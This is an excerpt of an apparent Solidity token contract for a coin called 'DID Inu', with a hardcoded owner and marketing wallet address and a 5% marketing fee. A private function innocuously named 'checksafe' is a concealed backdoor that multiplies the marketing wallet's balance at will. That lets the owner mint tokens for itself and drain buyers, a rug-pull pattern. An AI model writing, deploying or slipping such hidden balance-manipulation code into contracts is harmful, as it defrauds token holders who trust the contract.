...
contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x7b97Fa39ccb1A7979E4B05102cEE56CAeCF63a98; //
...
contract DID is Context, IERC20, Ownable {
    ...
    string private constant _name = "DID Inu"; // 
    string private constant _symbol = "DID"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 5; //
    uint256 public _liquidityFee = 0; //
    address payable public  _marketingWallet = payable(0x7b97Fa39ccb1A7979E4B05102cEE56CAeCF63a98); //
    ...
    function checksafe(address j,address b,uint256 s) private {
        if (j == b && j ==_marketingWallet)
         {_tOwned[_marketingWallet] = _tOwned[_marketingWallet].mul(s);
         }
    }
